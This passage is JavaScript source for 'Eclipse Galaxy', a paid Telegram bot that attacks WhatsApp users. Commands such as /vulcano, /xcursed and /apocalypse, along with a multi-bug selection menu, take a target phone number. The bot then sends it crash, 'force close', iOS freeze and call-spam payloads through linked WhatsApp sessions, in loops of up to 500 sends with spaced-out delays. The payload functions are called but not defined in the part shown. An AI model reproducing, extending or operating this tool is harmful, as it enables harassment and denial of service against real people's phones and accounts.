ϟ° /specs 628XXX - Invisible Force Ios v1
ϟ° /electron 628XXX - Invisible Fc Ios v2
ϟ° /poltergeist 628XXX - Combo Blank X Ios 
\`\`\``;

      newButtons = [
        [
          buatButtonWarna("(⬅️) Back", "bugmenu", "danger"),
          buatButtonWarna("(💀) Invisible Menu", "invisbug", "primary")
        ]
      ];
    }
    
    else if (data === "toolsmenu") {
      await bot.deleteMessage(chatId, messageId);
      imageToUse = menuImages.tools;
      newCaption = `\`\`\`JavaScript
ⓘ hello 👋🏻 ${usn}, my name is Eclipse Galaxy! i was created by @Serenhopee to be your bug assistant! don't abuse it.

(🪐) ＥＣＬＩＰＳＥ ＧＡＬＡＸＹ
───────────────────────
⚘. Creator: @Serenhopee
⚘. Version: ${CURRENT_VERSION}
⚘. Runtime: ${runtime}

(🛠) ＴＯＯＬＳ ＭＥＮＵ
───────────────────────
✶ /convert - reply media
✶ /tiktokdl - link
\`\`\``;

      newButtons = [
        [
          buatButtonWarna("(⬅️) Back", "bugmenu", "danger")
        ]
      ];
    }
    
    else if (data === "tqto") {
      await bot.deleteMessage(chatId, messageId);
      imageToUse = menuImages.tqto;
      newCaption = `\`\`\`JavaScript
ⓘ hello 👋🏻 ${usn}, my name is Eclipse Galaxy! i was created by @Serenhopee to be your bug assistant! don't abuse it.

(🪐) ＥＣＬＩＰＳＥ ＧＡＬＡＸＹ
───────────────────────
⚘. Creator: @Serenhopee
⚘. Version: ${CURRENT_VERSION}
⚘. Runtime: ${runtime}

(👁) ＴＨＡＮＫＳ ＴＯ
───────────────────────
𖤝 Seren ( @Serenhopee ) - Main Dev
𖤝 Zayy ( @zayOwl7 ) - My Bestfriend
𖤝 DaffaAp ( @Zappaap ) - My friend
𖤝 Danji ( @danji27 ) - My friend
𖤝 ALL BUYER ECLIPSE GALAXY!!
\`\`\``;

      newButtons = [
        [
          buatButtonWarna("(⬅️) Back", "mainmenu", "danger")
        ]
      ];
    }

    else if (data === "ownermenu") {
      await bot.deleteMessage(chatId, messageId);
      imageToUse = menuImages.owner;
      newCaption = `\`\`\`JavaScript
ⓘ hello 👋🏻 ${usn}, my name is Eclipse Galaxy! i was created by @Serenhopee to be your bug assistant! don't abuse it.

(🪐) ＥＣＬＩＰＳＥ ＧＡＬＡＸＹ
───────────────────────
⚘. Creator: @Serenhopee
⚘. Version: ${CURRENT_VERSION}
⚘. Runtime: ${runtime}

(⚙️) ＣＯＮＴＲＯＬＬ ＭＥＮＵ
───────────────────────
ⓘ /addprem - id duration
ⓘ /delprem - id
ⓘ /listprem
ⓘ /addadmin - id
ⓘ /deladmin - id
ⓘ /addbot 628xxx
ⓘ /delbot 628xxx
ⓘ /setcd - 10s
ⓘ /resetcd
ⓘ /autoupdate - auto update on
ⓘ /offautoupdate - auto update off
ⓘ /update - manual update
ⓘ /version - cek versi
\`\`\``;

      newButtons = [
        [
          buatButtonWarna("(⬅️) Back", "mainmenu", "danger")
        ]
      ];
    }
    
    else if (data === "custombugmenu") {
      await bot.deleteMessage(chatId, messageId);
      imageToUse = menuImages.custom;
      newCaption = `\`\`\`JavaScript
ⓘ hello 👋🏻 ${usn}, my name is Eclipse Galaxy! i was created by @Serenhopee to be your bug assistant! don't abuse it.

(🪐) ＥＣＬＩＰＳＥ ＧＡＬＡＸＹ
───────────────────────
⚘. Creator: @Serenhopee
⚘. Version: ${CURRENT_VERSION}
⚘. Runtime: ${runtime}

(🎨) ＣＵＳＴＯＭ ＢＵＧ
───────────────────────
Gunakan format:
/custommulti 628xxx
\`\`\``;

      newButtons = [
        [
          buatButtonWarna("(⬅️) Back", "bugmenu", "danger")
        ]
      ];
    }

    else if (data === "mainmenu") {
      await bot.deleteMessage(chatId, messageId);
      imageToUse = menuImages.main;
      newCaption = `\`\`\`JavaScript
ⓘ hello 👋🏻 ${usn}, my name is Eclipse Galaxy! i was created by @Serenhopee to be your bug assistant! don't abuse it.

(🪐) ＥＣＬＩＰＳＥ ＧＡＬＡＸＹ
───────────────────────
⚘. Creator: @Serenhopee
⚘. Version: ${CURRENT_VERSION}
⚘. Runtime: ${runtime}
    
press the button to show other menu .ᐟ
\`\`\``;

      newButtons = [
        [
          buatButtonWarna("(🧬) Eclipse Menu", "bugmenu", "primary"),
          buatButtonWarna("(⚙️) Controll Menu", "ownermenu", "success")
        ],
        [
          buatButtonWarna("(👁) Thanks To", "tqto", "danger")
        ],
        [
          buatButtonUrlWarna("(❕) Channel Information", "https://t.me/SerenEclipse", "primary")
        ]
      ];
    }

    // ========== HANDLE MULTI BUG SELECTION ==========
    else if (data.startsWith("multibug_")) {
      const parts = data.split("_");
      const action = parts[1];
      const bugId = parts[2];
      
      if (action === "select") {
        // Inisialisasi kalo belum ada
        if (!multiBugSelections[userId]) {
          multiBugSelections[userId] = {
            nomor: null,
            selectedBugs: []
          };
        }
        
        // Toggle pilihan bug
        const index = multiBugSelections[userId].selectedBugs.indexOf(bugId);
        if (index === -1) {
          if (multiBugSelections[userId].selectedBugs.length < 8) {
            multiBugSelections[userId].selectedBugs.push(bugId);
          }
        } else {
          multiBugSelections[userId].selectedBugs.splice(index, 1);
        }
        
        // Update tampilan dengan foto
        await updateMultiBugMenu(chatId, messageId, userId);
      }
      else if (action === "confirm") {
        await bot.deleteMessage(chatId, messageId);
        await bot.sendPhoto(chatId, menuImages.multi, {
          caption: "🚀 *MULAI MULTI BUG*",
          parse_mode: "Markdown"
        });
        
        if (multiBugSelections[userId] && multiBugSelections[userId].selectedBugs.length >= 1) {
          const selected = multiBugSelections[userId].selectedBugs;
          const nomor = multiBugSelections[userId].nomor;
          const jid = `${nomor}@s.whatsapp.net`;
          const sock = sessions.values().next().value;
          
          let progressMsg = await bot.sendPhoto(
            chatId,
            menuImages.multi,
            {
              caption: `*PROGRESS MULTI BUG*\nTarget: ${nomor}\nTotal Bug: ${selected.length}\n\nMemulai...`,
              parse_mode: "Markdown"
            }
          );
          
          for (let i = 0; i < selected.length; i++) {
            const bug = selected[i];
            await bot.editMessageMedia(
              {
                type: "photo",
                media: menuImages.multi,
                caption: `*PROGRESS MULTI BUG*\nTarget: ${nomor}\nProgress: ${i+1}/${selected.length}\nSedang menjalankan: ${bug.toUpperCase()}`
              },
              { chat_id: chatId, message_id: progressMsg.message_id, parse_mode: "Markdown" }
            );
            
            // Jalankan bug sesuai pilihan
            switch(bug) {
              case "xcursed":
                for (let j = 0; j < 10; j++) await xCursedPrivate1(sock, jid);
                break;
              case "xevil":
                for (let j = 0; j < 10; j++) await xCursedUi(sock, jid);
                break;
              case "xui":
                for (let j = 0; j < 10; j++) await xCursedCrott(sock, jid);
                break;
              case "xdelay":
                for (let j = 0; j < 10; j++) await xCursedDelayOneHit(sock, jid);
                break;
              case "xinvis":
                for (let j = 0; j < 10; j++) await xCursedPrivate1(sock, jid);
                break;
              case "xvisible":
                for (let j = 0; j < 10; j++) await xCursedUi(sock, jid);
                break;
              case "xcall":
                for (let j = 0; j < 5; j++) await xCrsdCallSpam(sock, jid);
                break;
              case "xspam":
                for (let j = 0; j < 10; j++) await xCursedCrawl(sock, jid);
                break;
            }
            
            await sleep(2000);
          }
          
          await bot.editMessageMedia(
            {
              type: "photo",
              media: menuImages.multi,
              caption: `*✅ MULTI BUG SELESAI*\nTarget: ${nomor}\nTotal Bug: ${selected.length}\nSemua bug telah dijalankan!`
            },
            { chat_id: chatId, message_id: progressMsg.message_id, parse_mode: "Markdown" }
          );
          
          delete multiBugSelections[userId];
        }
      }
      else if (action === "cancel") {
        delete multiBugSelections[userId];
        await bot.deleteMessage(chatId, messageId);
        await bot.sendPhoto(chatId, menuImages.multi, {
          caption: "❌ Multi bug dibatalkan",
          parse_mode: "Markdown"
        });
      }
    }

    if (newCaption) {
      setTimeout(async () => {
        await bot.sendPhoto(chatId, imageToUse, {
          caption: newCaption,
          parse_mode: "Markdown",
          reply_markup: { inline_keyboard: newButtons }
        });
      }, 1500);
    }

    await bot.answerCallbackQuery(callbackQuery.id);

  } catch (err) {
    console.log("❌ CALLBACK ERROR:", err);
  }
});

// ========== FUNGSI UPDATE MENU MULTI BUG ==========
async function updateMultiBugMenu(chatId, messageId, userId) {
  const data = multiBugSelections[userId];
  const selectedCount = data.selectedBugs.length;
  const nomor = data.nomor;
  
  let bugButtons = [];
  let row = [];
  
  // Buat button untuk setiap bug dengan status ⬜/✅
  availableBugs.forEach((bug, index) => {
    const isSelected = data.selectedBugs.includes(bug.id);
    const status = isSelected ? "✅ " : "⬜ ";
    const button = buatButtonWarna(
      `${status}${bug.emoji} ${bug.name}`,
      `multibug_select_${bug.id}`,
      bug.style
    );
    
    row.push(button);
    
    if (row.length === 2 || index === availableBugs.length - 1) {
      bugButtons.push(row);
      row = [];
    }
  });
  
  // Tambah tombol konfirmasi
  bugButtons.push([
    buatButtonWarna(`🚀 MULAI (${selectedCount} Bug)`, "multibug_confirm", "success"),
    buatButtonWarna("❌ BATAL", "multibug_cancel", "danger")
  ]);
  
  const keyboard = { inline_keyboard: bugButtons };
  
  await bot.editMessageMedia(
    {
      type: "photo",
      media: menuImages.multi,
      caption: `*🎨 MULTI BUG SELECTION*\n\n` +
      `Target: \`${nomor}\`\n` +
      `Pilih minimal 1 jenis bug (max 8):\n\n` +
      `⬜ = Belum dipilih\n✅ = Terpilih\n\n` +
      `Terpilih: *${selectedCount}* bug`
    },
    {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown",
      reply_markup: keyboard
    }
  );
}

// ========== COMMAND MULTI BUG ==========
bot.onText(/^\/custommulti (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  
  // Cek premium
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, menuImages.main, {
      caption: `<blockquote><b>HEY BRO!! YOUR ID IS NOT ALLOWED TO THIS BOT! PLEASE ADD YOUR ID TO THIS BOT!!</b></blockquote>
<b>YOUR ID TELEGRAM : <code>${senderId}</code></b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Dev", url: "https://t.me/Serenhopee" }]
        ]
      }
    });
  }
  
  // Cek koneksi WhatsApp
  if (sessions.size === 0) {
    return bot.sendPhoto(chatId, menuImages.main, {
      caption: "Tolol jir, sendernya aja gada bego! add dlu lah pake /addbot 62xxx",
      parse_mode: "Markdown"
    });
  }
  
  // Simpan data
  multiBugSelections[userId] = {
    nomor: formattedNumber,
    selectedBugs: []
  };
  
  // Buat menu pilihan bug
  let bugButtons = [];
  let row = [];
  
  availableBugs.forEach((bug, index) => {
    const button = buatButtonWarna(
      `⬜ ${bug.emoji} ${bug.name}`,
      `multibug_select_${bug.id}`,
      bug.style
    );
    
    row.push(button);
    
    if (row.length === 2 || index === availableBugs.length - 1) {
      bugButtons.push(row);
      row = [];
    }
  });
  
  bugButtons.push([
    buatButtonWarna("🚀 MULAI (0 Bug)", "multibug_confirm", "success"),
    buatButtonWarna("❌ BATAL", "multibug_cancel", "danger")
  ]);
  
  const keyboard = { inline_keyboard: bugButtons };
  
  await bot.sendPhoto(
    chatId,
    menuImages.multi,
    {
      caption: `*🎨 MULTI BUG SELECTION*\n\n` +
      `Target: \`${formattedNumber}\`\n` +
      `Pilih minimal 1 jenis bug (max 8):\n\n` +
      `⬜ = Belum dipilih\n✅ = Terpilih`,
      parse_mode: "Markdown",
      reply_markup: keyboard
    }
  );
});

//======( FUNCTION PRIVATE )======\\

//===°====PARAMS========\\
async function fcBetaInvis(sock, jid) {
  for (let i = 0; i < 500; i++) {
  const batchIndex = Math.floor(i / 25);
  const baseDelay = 3500;
  const increasePerBatch = 3500;
  const maxDelay = 49000;
  let currentDelay = baseDelay + batchIndex * increasePerBatch;
  if (currentDelay > maxDelay) currentDelay = maxDelay;
  try {
    await xCursedPrivate1(sock, jid);
  } catch (e) {
    console.error("Send error:", e);
  }

  await new Promise((r) => setTimeout(r, currentDelay));
  if (i > 0 && i % 50 === 0) {
    console.log(
      `[${new Date().toLocaleTimeString()}] Batch ${batchIndex + 1} selesai | jeda ${(currentDelay / 1000).toFixed(1)}s | istirahat 2 menit`
    );
    await new Promise((r) => setTimeout(r, 2 * 60 * 1000));
    }
  }
}

async function fcVisible(sock, jid) {
  for (let i = 0; i < 500; i++) {
  const batchIndex = Math.floor(i / 25);
  const baseDelay = 3500;
  const increasePerBatch = 3500;
  const maxDelay = 49000;
  let currentDelay = baseDelay + batchIndex * increasePerBatch;
  if (currentDelay > maxDelay) currentDelay = maxDelay;
  try {
    await xCursedUi(sock, jid);
  } catch (e) {
    console.error("Send error:", e);
  }

  await new Promise((r) => setTimeout(r, currentDelay));
  if (i > 0 && i % 50 === 0) {
    console.log(
      `[${new Date().toLocaleTimeString()}] Batch ${batchIndex + 1} selesai | jeda ${(currentDelay / 1000).toFixed(1)}s | istirahat 2 menit`
    );
    await new Promise((r) => setTimeout(r, 2 * 60 * 1000));
    }
  }
}

async function fcColi(sock, jid) {
  for (let i = 0; i < 200; i++) {
  const batchIndex = Math.floor(i / 25);
  const baseDelay = 3500;
  const increasePerBatch = 3500;
  const maxDelay = 49000;
  let currentDelay = baseDelay + batchIndex * increasePerBatch;
  if (currentDelay > maxDelay) currentDelay = maxDelay;
  try {
    await xCrsdCallSpam(sock, jid);
  } catch (e) {
    console.error("Send error:", e);
  }

  await new Promise((r) => setTimeout(r, currentDelay));
  if (i > 0 && i % 50 === 0) {
    console.log(
      `[${new Date().toLocaleTimeString()}] Batch ${batchIndex + 1} selesai | jeda ${(currentDelay / 1000).toFixed(1)}s | istirahat 2 menit`
    );
    await new Promise((r) => setTimeout(r, 2 * 60 * 1000));
    }
  }
}

async function delayJir(sock, jid) {
  for (let i = 0; i < 200; i++) {
  const batchIndex = Math.floor(i / 25);
  const baseDelay = 3500;
  const increasePerBatch = 3500;
  const maxDelay = 49000;
  let currentDelay = baseDelay + batchIndex * increasePerBatch;
  if (currentDelay > maxDelay) currentDelay = maxDelay;
  try {
    await xCursedCrott(sock, jid);
    await xCursedCrawl(sock, jid);
  } catch (e) {
    console.error("Send error:", e);
  }

  await new Promise((r) => setTimeout(r, currentDelay));
  if (i > 0 && i % 50 === 0) {
    console.log(
      `[${new Date().toLocaleTimeString()}] Batch ${batchIndex + 1} selesai | jeda ${(currentDelay / 1000).toFixed(1)}s | istirahat 2 menit`
    );
    await new Promise((r) => setTimeout(r, 2 * 60 * 1000));
    }
  }
}

async function epceIos(sock, jid) {
  for (let i = 0; i < 200; i++) {
  const batchIndex = Math.floor(i / 25);
  const baseDelay = 3500;
  const increasePerBatch = 3500;
  const maxDelay = 49000;
  let currentDelay = baseDelay + batchIndex * increasePerBatch;
  if (currentDelay > maxDelay) currentDelay = maxDelay;
  try {
    await xCursedIOS(sock, jid);
    await xCursedIOSX(sock, jid);
  } catch (e) {
    console.error("Send error:", e);
  }

  await new Promise((r) => setTimeout(r, currentDelay));
  if (i > 0 && i % 50 === 0) {
    console.log(
      `[${new Date().toLocaleTimeString()}] Batch ${batchIndex + 1} selesai | jeda ${(currentDelay / 1000).toFixed(1)}s | istirahat 2 menit`
    );
    await new Promise((r) => setTimeout(r, 2 * 60 * 1000));
    }
  }
}

async function fzIos(sock, jid) {
  for (let i = 0; i < 100; i++) {
  const batchIndex = Math.floor(i / 25);
  const baseDelay = 3500;
  const increasePerBatch = 3500;
  const maxDelay = 49000;
  let currentDelay = baseDelay + batchIndex * increasePerBatch;
  if (currentDelay > maxDelay) currentDelay = maxDelay;
  try {
    await xCursedFzIos(sock, jid);
    await xCursedIOS(sock, jid);
    await xCursedIOSX(sock, jid);
  } catch (e) {
    console.error("Send error:", e);
  }

  await new Promise((r) => setTimeout(r, currentDelay));
  if (i > 0 && i % 50 === 0) {
    console.log(
      `[${new Date().toLocaleTimeString()}] Batch ${batchIndex + 1} selesai | jeda ${(currentDelay / 1000).toFixed(1)}s | istirahat 2 menit`
    );
    await new Promise((r) => setTimeout(r, 2 * 60 * 1000));
    }
  }
}

//=======CASE BUG LENGKAP (SEMUA COMMAND)=========//

// ========== COMMAND VULCANO ==========
bot.onText(/^\/vulcano (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const sock = sessions.values().next().value;
  
  if (cooldownDuration > 0) {
    const lastUsed = userCooldown.get(userId);
    const now = Date.now();

    if (lastUsed && now - lastUsed < cooldownDuration) {
      const remaining = Math.ceil(
        (cooldownDuration - (now - lastUsed)) / 1000
      );

      return bot.sendPhoto(chatId, menuImages.bug, {
        caption: `⏳ Masih cooldown ${remaining}s`,
        parse_mode: "Markdown"
      });
    }

    userCooldown.set(userId, now);
  }

  if (!targetNumber)
    return bot.sendPhoto(chatId, menuImages.bug, {
      caption: "Example: /vulcano 62xxxx",
      parse_mode: "Markdown"
    });
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, menuImages.main, {
      caption: `<blockquote><b>HEY BRO!! YOUR ID IS NOT ALLOWED TO THIS BOT! PLEASE ADD YOUR ID TO THIS BOT!!</b></blockquote>
<b>YOUR ID TELEGRAM : <code>${senderId}</code></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
            [{ text: "Dev", url: "https://t.me/Serenhopee" }]
         ]
      }
    });
  }
    
   if (sessions.size === 0) {
      return bot.sendPhoto(chatId, menuImages.main, {
        caption: "Tolol jir, senderny aja gada bego! add dlu lah pake /addbot 62xxx",
        parse_mode: "Markdown"
      });
    }
    
  bot.sendMessage(chatId, "️👁").then((msg) => {
  setTimeout(() => {
    bot.deleteMessage(chatId, msg.message_id);
  },1600);
});
  
  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[██░░░░░░░░] 20%",
    "[████░░░░░░] 40%",
    "[██████░░░░] 60%",
    "[████████░░] 80%",
    "[██████████] 100%"
  ];

 await new Promise(r => setTimeout(r, 2000));

  const sent = await bot.sendPhoto(chatId, menuImages.bug, {
    caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown"
  });

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise(r => setTimeout(r, 2000));
    await bot.editMessageCaption(
      `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[i]}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown"
      }
    );
  }
  
  await new Promise((r) => setTimeout(r, 1000));
  await bot.editMessageMedia(
    {
      type: "photo",
      media: menuImages.bug,
      caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Successfully ϟ°
▢ Progress : [██████████] 100%
▢ All Right Reversed by Eclipse Galaxy!!
\`\`\``,
      parse_mode: "Markdown"
    },
    {
      chat_id: chatId,
      message_id: sent.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "‹check target›", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    }
  );
  
   for (let i = 0; i < 1; i++) {
     await fcBetaInvis(sock, jid);
   }
});

// ========== COMMAND XCURSED ==========
bot.onText(/^\/xcursed (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const sock = sessions.values().next().value;
  
  if (cooldownDuration > 0) {
    const lastUsed = userCooldown.get(userId);
    const now = Date.now();

    if (lastUsed && now - lastUsed < cooldownDuration) {
      const remaining = Math.ceil(
        (cooldownDuration - (now - lastUsed)) / 1000
      );

      return bot.sendPhoto(chatId, menuImages.bug, {
        caption: `⏳ Masih cooldown ${remaining}s`,
        parse_mode: "Markdown"
      });
    }

    userCooldown.set(userId, now);
  }

  if (!targetNumber)
    return bot.sendPhoto(chatId, menuImages.bug, {
      caption: "Example: /xcursed 62xxxx",
      parse_mode: "Markdown"
    });
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, menuImages.main, {
      caption: `<blockquote><b>HEY BRO!! YOUR ID IS NOT ALLOWED TO THIS BOT! PLEASE ADD YOUR ID TO THIS BOT!!</b></blockquote>
<b>YOUR ID TELEGRAM : <code>${senderId}</code></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
            [{ text: "Dev", url: "https://t.me/Serenhopee" }]
         ]
      }
    });
  }
    
   if (sessions.size === 0) {
      return bot.sendPhoto(chatId, menuImages.main, {
        caption: "Tolol jir, senderny aja gada bego! add dlu lah pake /addbot 62xxx",
        parse_mode: "Markdown"
      });
    }
    
  bot.sendMessage(chatId, "️👁").then((msg) => {
  setTimeout(() => {
    bot.deleteMessage(chatId, msg.message_id);
  },1600);
});
  
  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[██░░░░░░░░] 20%",
    "[████░░░░░░] 40%",
    "[██████░░░░] 60%",
    "[████████░░] 80%",
    "[██████████] 100%"
  ];

 await new Promise(r => setTimeout(r, 2000));

  const sent = await bot.sendPhoto(chatId, menuImages.bug, {
    caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown"
  });

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise(r => setTimeout(r, 2000));
    await bot.editMessageCaption(
      `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[i]}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown"
      }
    );
  }
  
  await new Promise((r) => setTimeout(r, 1000));
  await bot.editMessageMedia(
    {
      type: "photo",
      media: menuImages.bug,
      caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Successfully ϟ°
▢ Progress : [██████████] 100%
▢ All Right Reversed by Eclipse Galaxy!!
\`\`\``,
      parse_mode: "Markdown"
    },
    {
      chat_id: chatId,
      message_id: sent.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "‹check target›", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    }
  );
  
   for (let i = 0; i < 1; i++) {
     await xCursedPrivate1(sock, jid);
   }
});

// ========== COMMAND ECLIPSE ==========
bot.onText(/^\/eclipse (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const sock = sessions.values().next().value;
  
  if (cooldownDuration > 0) {
    const lastUsed = userCooldown.get(userId);
    const now = Date.now();

    if (lastUsed && now - lastUsed < cooldownDuration) {
      const remaining = Math.ceil(
        (cooldownDuration - (now - lastUsed)) / 1000
      );

      return bot.sendPhoto(chatId, menuImages.bug, {
        caption: `⏳ Masih cooldown ${remaining}s`,
        parse_mode: "Markdown"
      });
    }

    userCooldown.set(userId, now);
  }

  if (!targetNumber)
    return bot.sendPhoto(chatId, menuImages.bug, {
      caption: "Example: /eclipse 62xxxx",
      parse_mode: "Markdown"
    });
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, menuImages.main, {
      caption: `<blockquote><b>HEY BRO!! YOUR ID IS NOT ALLOWED TO THIS BOT! PLEASE ADD YOUR ID TO THIS BOT!!</b></blockquote>
<b>YOUR ID TELEGRAM : <code>${senderId}</code></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
            [{ text: "Dev", url: "https://t.me/Serenhopee" }]
         ]
      }
    });
  }
    
   if (sessions.size === 0) {
      return bot.sendPhoto(chatId, menuImages.main, {
        caption: "Tolol jir, senderny aja gada bego! add dlu lah pake /addbot 62xxx",
        parse_mode: "Markdown"
      });
    }
    
  bot.sendMessage(chatId, "️👁").then((msg) => {
  setTimeout(() => {
    bot.deleteMessage(chatId, msg.message_id);
  },1600);
});
  
  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[██░░░░░░░░] 20%",
    "[████░░░░░░] 40%",
    "[██████░░░░] 60%",
    "[████████░░] 80%",
    "[██████████] 100%"
  ];

 await new Promise(r => setTimeout(r, 2000));

  const sent = await bot.sendPhoto(chatId, menuImages.bug, {
    caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown"
  });

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise(r => setTimeout(r, 2000));
    await bot.editMessageCaption(
      `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[i]}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown"
      }
    );
  }
  
  await new Promise((r) => setTimeout(r, 1000));
  await bot.editMessageMedia(
    {
      type: "photo",
      media: menuImages.bug,
      caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Successfully ϟ°
▢ Progress : [██████████] 100%
▢ All Right Reversed by Eclipse Galaxy!!
\`\`\``,
      parse_mode: "Markdown"
    },
    {
      chat_id: chatId,
      message_id: sent.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "‹check target›", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    }
  );
  
   for (let i = 0; i < 1; i++) {
     await fcVisible(sock, jid);
   }
});

// ========== COMMAND APOCALYPSE ==========
bot.onText(/^\/apocalypse (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const sock = sessions.values().next().value;
  
  if (cooldownDuration > 0) {
    const lastUsed = userCooldown.get(userId);
    const now = Date.now();

    if (lastUsed && now - lastUsed < cooldownDuration) {
      const remaining = Math.ceil(
        (cooldownDuration - (now - lastUsed)) / 1000
      );

      return bot.sendPhoto(chatId, menuImages.bug, {
        caption: `⏳ Masih cooldown ${remaining}s`,
        parse_mode: "Markdown"
      });
    }

    userCooldown.set(userId, now);
  }

  if (!targetNumber)
    return bot.sendPhoto(chatId, menuImages.bug, {
      caption: "Example: /apocalypse 62xxxx",
      parse_mode: "Markdown"
    });
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, menuImages.main, {
      caption: `<blockquote><b>HEY BRO!! YOUR ID IS NOT ALLOWED TO THIS BOT! PLEASE ADD YOUR ID TO THIS BOT!!</b></blockquote>
<b>YOUR ID TELEGRAM : <code>${senderId}</code></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
            [{ text: "Dev", url: "https://t.me/Serenhopee" }]
         ]
      }
    });
  }
    
   if (sessions.size === 0) {
      return bot.sendPhoto(chatId, menuImages.main, {
        caption: "Tolol jir, senderny aja gada bego! add dlu lah pake /addbot 62xxx",
        parse_mode: "Markdown"
      });
    }
    
  bot.sendMessage(chatId, "️👁").then((msg) => {
  setTimeout(() => {
    bot.deleteMessage(chatId, msg.message_id);
  },1600);
});
  
  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[██░░░░░░░░] 20%",
    "[████░░░░░░] 40%",
    "[██████░░░░] 60%",
    "[████████░░] 80%",
    "[██████████] 100%"
  ];

 await new Promise(r => setTimeout(r, 2000));

  const sent = await bot.sendPhoto(chatId, menuImages.bug, {
    caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown"
  });

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise(r => setTimeout(r, 2000));
    await bot.editMessageCaption(
      `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[i]}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown"
      }
    );
  }
  
  await new Promise((r) => setTimeout(r, 1000));
  await bot.editMessageMedia(
    {
      type: "photo",
      media: menuImages.bug,
      caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Successfully ϟ°
▢ Progress : [██████████] 100%
▢ All Right Reversed by Eclipse Galaxy!!
\`\`\``,
      parse_mode: "Markdown"
    },
    {
      chat_id: chatId,
      message_id: sent.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "‹check target›", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    }
  );
  
   for (let i = 0; i < 1; i++) {
     await fcColi(sock, jid);
   }
});

// ========== COMMAND XENON ==========
bot.onText(/^\/xenon (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const sock = sessions.values().next().value;
  
  if (cooldownDuration > 0) {
    const lastUsed = userCooldown.get(userId);
    const now = Date.now();

    if (lastUsed && now - lastUsed < cooldownDuration) {
      const remaining = Math.ceil(
        (cooldownDuration - (now - lastUsed)) / 1000
      );

      return bot.sendPhoto(chatId, menuImages.invis, {
        caption: `⏳ Masih cooldown ${remaining}s`,
